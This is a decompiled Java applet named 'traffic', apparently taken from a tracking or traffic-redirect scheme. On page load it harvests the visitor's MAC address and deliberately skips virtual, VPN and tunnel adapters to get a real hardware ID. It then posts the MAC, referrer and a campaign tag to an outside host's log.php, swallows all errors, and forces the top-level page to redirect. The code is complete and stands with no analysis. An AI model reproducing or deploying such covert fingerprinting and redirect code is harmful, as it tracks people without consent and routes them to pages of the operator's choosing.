// 
// Decompiled by Procyon v0.5.30
// 

package traffic;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.net.SocketException;
import java.util.Enumeration;
import java.net.NetworkInterface;
import java.net.URLConnection;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.applet.Applet;

public class traffic extends Applet
{
    @Override
    public void init() {
        try {
            String resultBuffer = "";
            String readLineBuffer = "";
            final String redirectUrl = this.getParam("url");
            final String refer = this.getParam("ref");
            final String trafficParam = this.getParam("traffic");
            final String domainName = this.getParam("host");
            final String macAddress = this.getAddress();
            if (domainName.equals(null) || domainName.equals("")) {
                return;
            }
            final String postURL = "http://" + domainName + "/traffic/log.php";
            final URL url = new URL(postURL);
            final URLConnection virtualBrowser = url.openConnection();
            virtualBrowser.setDoOutput(true);
            final OutputStreamWriter outPut = new OutputStreamWriter(virtualBrowser.getOutputStream());
            outPut.write("ref=" + refer);
            outPut.write("&z=" + macAddress);
            outPut.write("&traffic=" + trafficParam);
            outPut.flush();
            final BufferedReader readBuffer = new BufferedReader(new InputStreamReader(virtualBrowser.getInputStream()));
            while ((readLineBuffer = readBuffer.readLine()) != null) {
                resultBuffer = String.valueOf(resultBuffer) + readLineBuffer;
            }
            outPut.close();
            readBuffer.close();
            if (!redirectUrl.equals("")) {
                this.getAppletContext().showDocument(new URL(redirectUrl), "_TOP");
            }
        }
        catch (Exception e) {}
    }
    
    public String getAddress() {
        String result = "undefined";
        try {
            final Enumeration<NetworkInterface> NIC = NetworkInterface.getNetworkInterfaces();
            while (NIC.hasMoreElements()) {
                final NetworkInterface currNIC = NIC.nextElement();
                String NICmac = this.hexToString(currNIC);
                final String NICname = currNIC.getName().toLowerCase();
                final String NICdescription = currNIC.getDisplayName().toLowerCase();
                if (NICmac.equals("000000000000")) {
                    NICmac = "";
                }
                if (NICmac.equals("111111111111")) {
                    NICmac = "";
                }
                if (NICmac.equals("FFFFFFFFFFFF")) {
                    NICmac = "";
                }
                if (NICname.startsWith("tun")) {
                    NICmac = "";
                }
                if (NICname.startsWith("vm")) {
                    NICmac = "";
                }
                if (NICdescription.contains("tunnel")) {
                    NICmac = "";
                }
                if (NICdescription.contains("pseudo")) {
                    NICmac = "";
                }
                if (NICdescription.contains("virtual")) {
                    NICmac = "";
                }
                if (NICdescription.contains("loopback")) {
                    NICmac = "";
                }
                if (NICdescription.contains("ppp")) {
                    NICmac = "";
                }
                if (NICdescription.contains("slip")) {
                    NICmac = "";
                }
                if (NICdescription.contains("vpn")) {
                    NICmac = "";
                }
                if (NICname.startsWith("e") && NICmac.length() == 12) {
                    return NICmac;
                }
                if (NICmac.length() != 12 || result != "undefined") {
                    continue;
                }
                result = NICmac;
            }
        }
        catch (Exception ex) {
            return "error";
        }
        return result;
    }
    
    public String hexToString(final NetworkInterface ni) throws SocketException {
        final String separator = "";
        final byte[] mac = ni.getHardwareAddress();
        if (mac != null) {
            final StringBuffer theAddress = new StringBuffer("");
            String sep = "";
            byte[] array;
            for (int length = (array = mac).length, i = 0; i < length; ++i) {
                final byte o = array[i];
                theAddress.append(sep).append(String.format("%02X", o));
                sep = separator;
            }
            return theAddress.toString();
        }
        return "";
    }
    
    public String getParam(final String paramName) {
        String theValue = "";
        try {
            theValue = this.getParameter(paramName);
        }
        catch (Exception e) {
            theValue = "";
        }
        return theValue;
    }
    
    public String md5(String str) {
        try {
            final MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(str.getBytes(), 0, str.length());
            str = new BigInteger(1, m.digest()).toString(16);
        }
        catch (Exception ex) {}
        return str;
    }
}
